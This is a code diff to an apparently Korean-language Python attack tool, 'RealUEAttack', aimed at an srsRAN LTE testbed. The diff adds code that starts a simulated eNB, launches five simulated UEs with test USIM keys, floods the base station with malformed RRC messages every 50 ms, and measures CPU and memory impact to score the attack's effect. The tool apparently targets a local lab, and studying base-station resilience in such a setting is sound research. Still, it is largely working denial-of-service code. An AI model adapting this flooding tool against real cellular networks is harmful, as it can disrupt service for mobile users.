@@ -354,25 +354,63 @@ class RealUEAttack:
         return success_count
     
     def simulate_physical_layer_connection(self):
-        """물리 계층 연결 시뮬레이션"""
+        """물리 계층 연결 시뮬레이션 (실제 srsRAN UE 사용)"""
         print(f"=== 물리 계층 연결 시뮬레이션 시작 ===")
         
         try:
-            # 1. 실제 네트워크 인터페이스를 통한 연결 시도
-            # srsRAN의 실제 UE 시뮬레이션을 위한 명령어 실행
-            cmd = [
-                "sudo", "srsue", "--rf.device=zmq", 
-                "--rf.device_args=tx_port=tcp://localhost:2001,rx_port=tcp://localhost:2000",
-                "--rf.freq=2680000000", "--rf.gain=76",
-                "--nas.apn=internet", "--nas.eia=1,2,3", "--nas.eea=0,1,2,3"
-            ]
+            # srsRAN UE 설정 파일 생성
+            ue_config = """
+[rf]
+device_name = zmq
+device_args = tx_port=tcp://localhost:2001,rx_port=tcp://localhost:2000
+tx_gain = 76
+rx_gain = 76
+freq = 2680000000
+
+[rat.eutra]
+dl_earfcn = 2680
+ul_earfcn = 25680
+
+[rat.eutra.dl]
+nof_prb = 50
+
+[rat.eutra.ul]
+nof_prb = 50
+
+[nas]
+apn = internet
+apn_protocol = ipv4
+user = 
+pass = 
+force_imsi_attach = true
+imsi = 001010123456789
+imei = 353490069873319
+imei_sv = 3534900698733190
+
+[usim]
+algo = milenage
+op = 63BFA50EE9864AAB33CC72DD78524B98
+k = 00112233445566778899AABBCCDDEEFF
+imsi = 001010123456789
+imei = 353490069873319
+"""
             
-            # 백그라운드에서 UE 프로세스 시작
+            # 설정 파일 저장
+            config_file = "/tmp/ue.conf"
+            with open(config_file, 'w') as f:
+                f.write(ue_config)
+            
+            # srsRAN UE 프로세스 시작
+            cmd = ["sudo", "srsue", "-c", config_file]
+            
             process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                      stderr=subprocess.PIPE, text=True)
             
             print(f"UE 프로세스 시작: PID {process.pid}")
-            time.sleep(2)  # UE 초기화 대기
+            print(f"설정 파일: {config_file}")
+            
+            # UE 초기화 대기
+            time.sleep(5)
             
             return process
             
@@ -421,6 +459,110 @@ class RealUEAttack:
         
         print(f"=== 악성 RRC 메시지 전송 완료: {success_count}/{count} 성공 ===")
         return success_count
+    
+    def check_srsran_enb_status(self):
+        """srsRAN eNB 상태 확인"""
+        print(f"=== srsRAN eNB 상태 확인 ===")
+        
+        try:
+            # eNB 프로세스 확인
+            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
+            lines = result.stdout.split('\n')
+            
+            enb_processes = []
+            for line in lines:
+                if 'srsenb' in line.lower():
+                    enb_processes.append(line)
+            
+            if enb_processes:
+                print(f"eNB 프로세스 발견: {len(enb_processes)}개")
+                for process in enb_processes:
+                    print(f"  {process}")
+            else:
+                print("eNB 프로세스가 실행되지 않음")
+                return False
+            
+            # eNB 포트 확인
+            result = subprocess.run(['netstat', '-tlnp'], capture_output=True, text=True)
+            lines = result.stdout.split('\n')
+            
+            enb_ports = []
+            for line in lines:
+                if '2000' in line or '2001' in line:
+                    enb_ports.append(line)
+            
+            if enb_ports:
+                print(f"eNB 포트 발견: {len(enb_ports)}개")
+                for port in enb_ports:
+                    print(f"  {port}")
+            else:
+                print("eNB 포트가 열려있지 않음")
+                return False
+            
+            return True
+            
+        except Exception as e:
+            print(f"eNB 상태 확인 실패: {e}")
+            return False
+    
+    def start_srsran_enb(self):
+        """srsRAN eNB 시작"""
+        print(f"=== srsRAN eNB 시작 ===")
+        
+        try:
+            # eNB 설정 파일 생성
+            enb_config = """
+[rf]
+device_name = zmq
+device_args = tx_port=tcp://localhost:2000,rx_port=tcp://localhost:2001
+tx_gain = 76
+rx_gain = 76
+freq = 2680000000
+
+[rat.eutra]
+dl_earfcn = 2680
+ul_earfcn = 25680
+
+[rat.eutra.dl]
+nof_prb = 50
+
+[rat.eutra.ul]
+nof_prb = 50
+
+[enb]
+enb_id = 0x19B
+mcc = 001
+mnc = 01
+mme_addr = 127.0.0.1
+gtp_bind_addr = 127.0.0.1
+s1c_bind_addr = 127.0.0.1
+s1c_bind_port = 36412
+gtp_bind_addr = 127.0.0.1
+gtp_bind_port = 2123
+"""
+            
+            # 설정 파일 저장
+            config_file = "/tmp/enb.conf"
+            with open(config_file, 'w') as f:
+                f.write(enb_config)
+            
+            # srsRAN eNB 프로세스 시작
+            cmd = ["sudo", "srsenb", "-c", config_file]
+            
+            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
+                                     stderr=subprocess.PIPE, text=True)
+            
+            print(f"eNB 프로세스 시작: PID {process.pid}")
+            print(f"설정 파일: {config_file}")
+            
+            # eNB 초기화 대기
+            time.sleep(10)
+            
+            return process
+            
+        except Exception as e:
+            print(f"eNB 시작 실패: {e}")
+            return None
     
     def monitor_enb_responses(self, duration=5):
         """eNB 응답 모니터링"""
@@ -952,7 +1094,17 @@ class RealUEAttack:
         start_time = time.time()
         total_messages = 0
         
-        # 1. 물리 계층 연결 시뮬레이션
+        # 1. eNB 상태 확인 및 시작
+        if not self.check_srsran_enb_status():
+            self.log_message("eNB가 실행되지 않음. eNB를 시작합니다...")
+            enb_process = self.start_srsran_enb()
+            if not enb_process:
+                self.log_message("eNB 시작 실패. 공격을 중단합니다.")
+                return
+        else:
+            enb_process = None
+        
+        # 2. 물리 계층 연결 시뮬레이션
         ue_process = self.simulate_physical_layer_connection()
         
         # 2. 응답 모니터링 스레드 시작
@@ -985,6 +1137,16 @@ class RealUEAttack:
             except:
                 ue_process.kill()
                 print("UE 프로세스 강제 종료됨")
+        
+        # eNB 프로세스 종료 (필요한 경우)
+        if enb_process:
+            try:
+                enb_process.terminate()
+                enb_process.wait(timeout=5)
+                print("eNB 프로세스 종료됨")
+            except:
+                enb_process.kill()
+                print("eNB 프로세스 강제 종료됨")
         
         # 공격 종료 후 리소스 상태 캡처
         self.log_message("=" * 50)
@@ -1051,6 +1213,337 @@ class RealUEAttack:
         self.log_message(f"총 {total_messages}개 메시지 전송")
         self.log_message(f"공격 시간: {(self.end_time - self.start_time).total_seconds():.1f}초")
         self.log_message("=" * 50)
+    
+    def real_srsran_attack(self, duration=60):
+        """실제 srsRAN 환경에서의 공격"""
+        self.setup_logging("real_srsran", duration)
+        
+        # 공격 시작 전 리소스 상태 캡처
+        self.log_message("공격 시작 전 리소스 상태 캡처 중...")
+        self.start_stats = self.get_system_stats()
+        self.start_time = datetime.now()
+        
+        if self.start_stats:
+            self.log_message(f"시작 CPU: {self.start_stats['cpu_percent']:.1f}%")
+            self.log_message(f"시작 메모리: {self.start_stats['memory_percent']:.1f}% ({self.start_stats['memory_used_gb']:.2f}GB)")
+            self.log_message(f"시작 네트워크 송신: {self.start_stats['bytes_sent']:,} bytes")
+            self.log_message(f"시작 네트워크 수신: {self.start_stats['bytes_recv']:,} bytes")
+            self.log_message(f"시작 srsRAN CPU: {self.start_stats['srsran_cpu']:.1f}%")
+            self.log_message(f"시작 srsRAN 메모리: {self.start_stats['srsran_memory']:.1f}%")
+        
+        self.log_message("=" * 50)
+        self.log_message(f"=== 실제 srsRAN 환경 공격 시작 ===")
+        self.log_message(f"대상 포트: {self.target_port}")
+        self.log_message(f"지속 시간: {duration}초")
+        self.log_message("=" * 50)
+        
+        self.running = True
+        start_time = time.time()
+        total_messages = 0
+        
+        # 1. eNB 상태 확인 및 시작
+        if not self.check_srsran_enb_status():
+            self.log_message("eNB가 실행되지 않음. eNB를 시작합니다...")
+            enb_process = self.start_srsran_enb()
+            if not enb_process:
+                self.log_message("eNB 시작 실패. 공격을 중단합니다.")
+                return
+        else:
+            enb_process = None
+        
+        # 2. 다중 UE 프로세스 시작
+        ue_processes = []
+        for i in range(5):  # 5개 UE 동시 실행
+            ue_process = self.simulate_physical_layer_connection()
+            if ue_process:
+                ue_processes.append(ue_process)
+            time.sleep(1)  # UE 간 시작 간격
+        
+        # 3. 응답 모니터링 스레드 시작
+        response_thread = threading.Thread(target=self.monitor_enb_responses, args=(duration,))
+        response_thread.daemon = True
+        response_thread.start()
+        
+        # 4. srsRAN 로그 모니터링 스레드 시작
+        log_thread = threading.Thread(target=self.monitor_srsran_logs, args=(duration,))
+        log_thread.daemon = True
+        log_thread.start()
+        
+        while self.running and (time.time() - start_time) < duration:
+            # 악성 메시지 전송
+            sent_count = self.send_malformed_rrc_messages(100)
+            total_messages += sent_count
+            
+            # 완전한 연결 시퀀스 수행
+            if self.perform_complete_connection_sequence():
+                total_messages += 1
+            
+            time.sleep(0.05)  # 50ms 간격 (더 빠른 공격)
+        
+        # UE 프로세스들 종료
+        for i, ue_process in enumerate(ue_processes):
+            try:
+                ue_process.terminate()
+                ue_process.wait(timeout=5)
+                print(f"UE 프로세스 #{i+1} 종료됨")
+            except:
+                ue_process.kill()
+                print(f"UE 프로세스 #{i+1} 강제 종료됨")
+        
+        # eNB 프로세스 종료 (필요한 경우)
+        if enb_process:
+            try:
+                enb_process.terminate()
+                enb_process.wait(timeout=5)
+                print("eNB 프로세스 종료됨")
+            except:
+                enb_process.kill()
+                print("eNB 프로세스 강제 종료됨")
+        
+        # 공격 종료 후 리소스 상태 캡처
+        self.log_message("=" * 50)
+        self.log_message("공격 종료 후 리소스 상태 캡처 중...")
+        self.end_stats = self.get_system_stats()
+        self.end_time = datetime.now()
+        
+        if self.end_stats:
+            self.log_message(f"종료 CPU: {self.end_stats['cpu_percent']:.1f}%")
+            self.log_message(f"종료 메모리: {self.end_stats['memory_percent']:.1f}% ({self.end_stats['memory_used_gb']:.2f}GB)")
+            self.log_message(f"종료 네트워크 송신: {self.end_stats['bytes_sent']:,} bytes")
+            self.log_message(f"종료 네트워크 수신: {self.end_stats['bytes_recv']:,} bytes")
+            self.log_message(f"종료 srsRAN CPU: {self.end_stats['srsran_cpu']:.1f}%")
+            self.log_message(f"종료 srsRAN 메모리: {self.end_stats['srsran_memory']:.1f}%")
+        
+        # 리소스 변화량 계산 및 출력
+        if self.start_stats and self.end_stats:
+            self.log_message("=" * 50)
+            self.log_message("=== 리소스 변화량 분석 ===")
+            
+            cpu_change = self.end_stats['cpu_percent'] - self.start_stats['cpu_percent']
+            memory_change = self.end_stats['memory_percent'] - self.start_stats['memory_percent']
+            memory_gb_change = self.end_stats['memory_used_gb'] - self.start_stats['memory_used_gb']
+            bytes_sent_change = self.end_stats['bytes_sent'] - self.start_stats['bytes_sent']
+            bytes_recv_change = self.end_stats['bytes_recv'] - self.start_stats['bytes_recv']
+            srsran_cpu_change = self.end_stats['srsran_cpu'] - self.start_stats['srsran_cpu']
+            srsran_memory_change = self.end_stats['srsran_memory'] - self.start_stats['srsran_memory']
+            
+            self.log_message(f"CPU 변화: {cpu_change:+.1f}%")
+            self.log_message(f"메모리 변화: {memory_change:+.1f}% ({memory_gb_change:+.2f}GB)")
+            self.log_message(f"네트워크 송신 변화: {bytes_sent_change:+,} bytes")
+            self.log_message(f"네트워크 수신 변화: {bytes_recv_change:+,} bytes")
+            self.log_message(f"srsRAN CPU 변화: {srsran_cpu_change:+.1f}%")
+            self.log_message(f"srsRAN 메모리 변화: {srsran_memory_change:+.1f}%")
+            
+            # 공격 효과 분석
+            self.log_message("=" * 50)
+            self.log_message("=== 공격 효과 분석 ===")
+            if abs(cpu_change) > 5:
+                self.log_message(f"✓ CPU 사용량이 {'증가' if cpu_change > 0 else '감소'}했습니다 ({cpu_change:+.1f}%)")
+            else:
+                self.log_message(f"✗ CPU 사용량 변화가 미미합니다 ({cpu_change:+.1f}%)")
+            
+            if abs(memory_change) > 2:
+                self.log_message(f"✓ 메모리 사용량이 {'증가' if memory_change > 0 else '감소'}했습니다 ({memory_change:+.1f}%)")
+            else:
+                self.log_message(f"✗ 메모리 사용량 변화가 미미합니다 ({memory_change:+.1f}%)")
+            
+            if abs(srsran_cpu_change) > 5:
+                self.log_message(f"✓ srsRAN CPU 사용량이 {'증가' if srsran_cpu_change > 0 else '감소'}했습니다 ({srsran_cpu_change:+.1f}%)")
+            else:
+                self.log_message(f"✗ srsRAN CPU 사용량 변화가 미미합니다 ({srsran_cpu_change:+.1f}%)")
+            
+            if abs(srsran_memory_change) > 2:
+                self.log_message(f"✓ srsRAN 메모리 사용량이 {'증가' if srsran_memory_change > 0 else '감소'}했습니다 ({srsran_memory_change:+.1f}%)")
+            else:
+                self.log_message(f"✗ srsRAN 메모리 사용량 변화가 미미합니다 ({srsran_memory_change:+.1f}%)")
+        
+        # 결과를 JSON 파일로 저장
+        self.save_attack_results(total_messages, duration, total_messages)
+        
+        self.log_message("=" * 50)
+        self.log_message(f"=== 실제 srsRAN 환경 공격 완료 ===")
+        self.log_message(f"총 {total_messages}개 메시지 전송")
+        self.log_message(f"UE 프로세스: {len(ue_processes)}개")
+        self.log_message(f"공격 시간: {(self.end_time - self.start_time).total_seconds():.1f}초")
+        self.log_message("=" * 50)
+    
+    def test_basic_connection(self):
+        """기본 연결 테스트 (공격 전)"""
+        print(f"=== 기본 연결 테스트 시작 ===")
+        
+        # 1. eNB 상태 확인
+        print(f"1. eNB 상태 확인...")
+        if not self.check_srsran_enb_status():
+            print("eNB가 실행되지 않음. eNB를 시작합니다...")
+            enb_process = self.start_srsran_enb()
+            if not enb_process:
+                print("eNB 시작 실패")
+                return False
+        else:
+            print("eNB가 정상 실행 중")
+        
+        # 2. 실제 srsRAN UE로 연결 테스트
+        print(f"2. 실제 srsRAN UE로 연결 테스트...")
+        ue_process = self.simulate_physical_layer_connection()
+        if not ue_process:
+            print("UE 시작 실패")
+            return False
+        
+        # 3. 연결 상태 모니터링
+        print(f"3. 연결 상태 모니터링 (30초)...")
+        start_time = time.time()
+        connection_success = False
+        
+        while (time.time() - start_time) < 30:
+            # UE 프로세스 상태 확인
+            if ue_process.poll() is not None:
+                print("UE 프로세스가 종료됨")
+                break
+            
+            # 간단한 메시지 전송 테스트
+            try:
+                socket = self.context.socket(zmq.PUSH)
+                socket.connect(f"tcp://localhost:{self.target_port}")
+                
+                # 간단한 테스트 메시지
+                test_message = b'\x00\x01\x02\x03'
+                socket.send(test_message, zmq.NOBLOCK)
+                socket.close()
+                
+                print(f"테스트 메시지 전송: {test_message.hex()}")
+                time.sleep(1)
+                
+            except Exception as e:
+                print(f"메시지 전송 실패: {e}")
+            
+            time.sleep(1)
+        
+        # 4. UE 프로세스 종료
+        try:
+            ue_process.terminate()
+            ue_process.wait(timeout=5)
+            print("UE 프로세스 종료됨")
+        except:
+            ue_process.kill()
+            print("UE 프로세스 강제 종료됨")
+        
+        print(f"=== 기본 연결 테스트 완료 ===")
+        return connection_success
+    
+    def analyze_srsran_ue_connection(self):
+        """실제 srsRAN UE 연결 과정 분석"""
+        print(f"=== srsRAN UE 연결 과정 분석 ===")
+        
+        try:
+            # 실제 srsRAN UE 실행 및 로그 캡처
+            ue_config = """
+[rf]
+device_name = zmq
+device_args = tx_port=tcp://localhost:2001,rx_port=tcp://localhost:2000
+tx_gain = 76
+rx_gain = 76
+freq = 2680000000
+
+[rat.eutra]
+dl_earfcn = 2680
+ul_earfcn = 25680
+
+[rat.eutra.dl]
+nof_prb = 50
+
+[rat.eutra.ul]
+nof_prb = 50
+
+[nas]
+apn = internet
+apn_protocol = ipv4
+user = 
+pass = 
+force_imsi_attach = true
+imsi = 001010123456789
+imei = 353490069873319
+imei_sv = 3534900698733190
+
+[usim]
+algo = milenage
+op = 63BFA50EE9864AAB33CC72DD78524B98
+k = 00112233445566778899AABBCCDDEEFF
+imsi = 001010123456789
+imei = 353490069873319
+"""
+            
+            # 설정 파일 저장
+            config_file = "/tmp/ue_analysis.conf"
+            with open(config_file, 'w') as f:
+                f.write(ue_config)
+            
+            # srsRAN UE 프로세스 시작 (로그 캡처)
+            cmd = ["sudo", "srsue", "-c", config_file, "-v"]
+            
+            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
+                                     stderr=subprocess.PIPE, text=True)
+            
+            print(f"UE 프로세스 시작: PID {process.pid}")
+            print(f"설정 파일: {config_file}")
+            
+            # 연결 과정 로그 수집
+            connection_logs = []
+            start_time = time.time()
+            
+            while (time.time() - start_time) < 60:  # 60초 동안 모니터링
+                line = process.stdout.readline()
+                if line:
+                    timestamp = datetime.now().strftime('%H:%M:%S')
+                    log_entry = f"[{timestamp}] {line.strip()}"
+                    connection_logs.append(log_entry)
+                    print(log_entry)
+                    
+                    # 연결 성공 신호 확인
+                    if "RRC Connected" in line or "Attach successful" in line:
+                        print("✓ 연결 성공!")
+                        break
+                elif process.poll() is not None:
+                    print("UE 프로세스 종료됨")
+                    break
+                
+                time.sleep(0.1)
+            
+            # 프로세스 종료
+            try:
+                process.terminate()
+                process.wait(timeout=5)
+            except:
+                process.kill()
+            
+            # 로그 분석
+            print(f"\n=== 연결 과정 분석 ===")
+            print(f"총 로그 엔트리: {len(connection_logs)}개")
+            
+            # 중요한 로그만 필터링
+            important_logs = []
+            keywords = ["RRC", "RA", "preamble", "connection", "attach", "error", "fail"]
+            
+            for log in connection_logs:
+                if any(keyword in log.lower() for keyword in keywords):
+                    important_logs.append(log)
+            
+            print(f"중요한 로그: {len(important_logs)}개")
+            for log in important_logs[:20]:  # 최대 20개만 출력
+                print(f"  {log}")
+            
+            # 로그 파일 저장
+            log_file = f"{self.log_dir}/srsran_ue_analysis_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
+            with open(log_file, 'w', encoding='utf-8') as f:
+                for log in connection_logs:
+                    f.write(log + '\n')
+            
+            print(f"분석 로그 저장: {log_file}")
+            
+            return len(important_logs) > 0
+            
+        except Exception as e:
+            print(f"srsRAN UE 연결 분석 실패: {e}")
+            return False
     
     def run_all_attacks(self, duration=60):
         """모든 공격 유형을 순차적으로 실행하고 결과 비교"""
@@ -1520,7 +2013,7 @@ def main():
     parser = argparse.ArgumentParser(description='실제 UE 메시지를 사용한 공격')
     parser.add_argument('--target-port', type=int, default=2001, help='eNB 포트 (기본값: 2001)')
     parser.add_argument('--duration', type=int, default=60, help='공격 지속 시간 (초)')
-    parser.add_argument('--attack-type', choices=['rrc', 'zeromq', 'mixed', 'aggressive', 'advanced', 'all'], 
+    parser.add_argument('--attack-type', choices=['rrc', 'zeromq', 'mixed', 'aggressive', 'advanced', 'real', 'test', 'analyze', 'all'], 
                        default='mixed', help='공격 유형')
     
     args = parser.parse_args()
@@ -1536,6 +2029,12 @@ def main():
             attacker.aggressive_rrc_flood(args.duration)
         elif args.attack_type == 'advanced':
             attacker.advanced_dos_attack(args.duration)
+        elif args.attack_type == 'real':
+            attacker.real_srsran_attack(args.duration)
+        elif args.attack_type == 'test':
+            attacker.test_basic_connection()
+        elif args.attack_type == 'analyze':
+            attacker.analyze_srsran_ue_connection()
         elif args.attack_type == 'all':
             attacker.run_all_attacks(args.duration)
         else:
